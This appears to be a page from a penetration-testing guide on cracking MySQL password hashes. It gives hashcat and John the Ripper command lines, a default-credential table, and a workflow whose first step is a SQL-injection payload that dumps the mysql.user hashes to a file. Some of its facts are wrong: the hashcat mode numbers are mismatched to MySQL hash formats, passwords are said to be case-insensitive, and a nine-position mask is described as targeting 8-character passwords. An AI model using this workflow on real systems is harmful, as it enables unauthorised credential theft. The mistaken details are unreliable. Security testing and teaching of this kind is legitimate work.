---
title: Password Cracking
description: Techniques for cracking MySQL password hashes
category: Authentication
order: 24
tags: ["password cracking", "authentication", "hash breaking"]
lastUpdated: 2025-03-15
---

## Password Cracking

After extracting MySQL password hashes through SQL injection, the next step is often to attempt to crack these hashes to obtain cleartext passwords. This knowledge can be useful for privilege escalation, lateral movement, or accessing other systems where credentials might be reused.

### MySQL Hash Types

Before attempting to crack MySQL password hashes, it's important to identify the hash type:

| MySQL Version   | Hash Format             | Example                                     |
| --------------- | ----------------------- | ------------------------------------------- |
| Pre-4.1         | 16-character hex        | `5d2e19393cc5ef67`                          |
| 4.1 to 5.6      | '\*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
| 5.7+ (default)  | '\*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
| 8.0+ (optional) | '$A$005$' + mixed case  | `$A$005$XKK#jY,d89Z0s8...`                  |

### Cracking Tools

Several tools can be used to crack MySQL password hashes:

| Tool            | Description                      | Strengths                        |
| --------------- | -------------------------------- | -------------------------------- |
| Hashcat         | GPU-accelerated password cracker | Fast, supports many attack modes |
| John the Ripper | CPU-based password cracker       | Well-established, flexible       |
| Hydra           | Online password cracker          | For direct MySQL authentication  |
| Medusa          | Online password cracker          | For direct MySQL authentication  |
| Custom scripts  | Python/Ruby scripts              | For specialized attacks          |

### Hashcat Commands for MySQL Hashes

```bash
# MySQL pre-4.1 (hash mode 300)
hashcat -m 300 -a 0 mysql_old_hashes.txt wordlist.txt

# MySQL 4.1+ (hash mode 300) with the '*' removed
hashcat -m 300 -a 0 mysql_hashes.txt wordlist.txt

# MySQL sha1(sha1(pass)) (hash mode 11200) with full hash including '*'
hashcat -m 11200 -a 0 mysql_hashes.txt wordlist.txt
```

### John the Ripper Commands

```bash
# MySQL pre-4.1
john --format=mysql mysql_old_hashes.txt

# MySQL 4.1+
john --format=mysql-sha1 mysql_hashes.txt
```

### Attack Strategies

#### Dictionary Attack

Using a wordlist of common passwords:

```bash
hashcat -m 11200 -a 0 mysql_hashes.txt rockyou.txt
```

#### Rule-based Attack

Applying transformations to dictionary words:

```bash
hashcat -m 11200 -a 0 mysql_hashes.txt rockyou.txt -r rules/best64.rule
```

#### Brute Force Attack

Trying all possible combinations of characters:

```bash
# Brute force up to 8 characters (lowercase only)
hashcat -m 11200 -a 3 mysql_hashes.txt ?l?l?l?l?l?l?l?l
```

#### Mask Attack

Targeted brute force using patterns:

```bash
# Target 8-char passwords with digits at the end (e.g., "password123")
hashcat -m 11200 -a 3 mysql_hashes.txt ?l?l?l?l?l?l?d?d?d
```

#### Hybrid Attack

Combining dictionary words with patterns:

```bash
# Words from dictionary with up to 4 digits appended
hashcat -m 11200 -a 6 mysql_hashes.txt rockyou.txt ?d?d?d?d
```

### Common Default Passwords

Many MySQL installations use default or weak passwords:

| Username | Common Passwords               |
| -------- | ------------------------------ |
| root     | (empty), root, password, mysql |
| admin    | admin, password, mysql         |
| backup   | backup, password               |
| user     | user, password                 |
| test     | test, password                 |

### Wordlist Resources

Some useful wordlist sources:

1. RockYou (classic large password list)
2. SecLists (collection of multiple wordlists)
3. HashesOrg (repository of real-world password leaks)
4. CrackStation (very large wordlist)

### Special Considerations for MySQL Passwords

1. **Pre-4.1 Hash Weaknesses**: The old MySQL hash algorithm is extremely weak and can be cracked quickly.

2. **Case Insensitivity**: In MySQL versions up to 8.0, passwords are case-insensitive by default.

3. **Salt Absence**: MySQL 4.1+ hashes do not use a per-user salt, making them vulnerable to rainbow table attacks.

4. **Common Patterns**: Database passwords often follow patterns like "dbname_user" or "company_db".

### Practical Example Workflow

1. **Extract hashes**:

   ```sql
   ' UNION SELECT User, Password FROM mysql.user INTO OUTFILE '/tmp/mysql_hashes.txt' -- -
   ```

   > **Note:** `INTO OUTFILE` requires MySQL's `secure_file_priv` system variable to allow writes to the target directory. Many modern MySQL installations restrict this to a specific directory or disable it entirely (`secure_file_priv = NULL`). This example may not work without adjusting server configuration or having appropriate privileges.

2. **Prepare hash file** (remove '\*' if using hashcat mode 300):

   ```bash
   cat mysql_hashes.txt | cut -d '*' -f 2 > mysql_hashes_clean.txt
   ```

3. **Run cracking tool**:

   ```bash
   hashcat -m 11200 -a 0 mysql_hashes.txt rockyou.txt -r rules/best64.rule
   ```

4. **Check results**:
   ```bash
   hashcat -m 11200 mysql_hashes.txt --show
   ```

### Ethical and Legal Considerations

- Only crack password hashes of systems you have explicit permission to test
- Maintain proper documentation and authorization
- Report findings responsibly
- Do not use cracked passwords for unauthorized access

### Mitigation Strategies

To protect against password cracking:

1. Use strong, unique passwords for MySQL accounts
2. Implement password complexity requirements
3. Use MySQL 8.0+ with the newer caching_sha2_password authentication plugin
4. Implement proper user access controls and least privilege
5. Regularly rotate database passwords
6. Consider using a database firewall or proxy
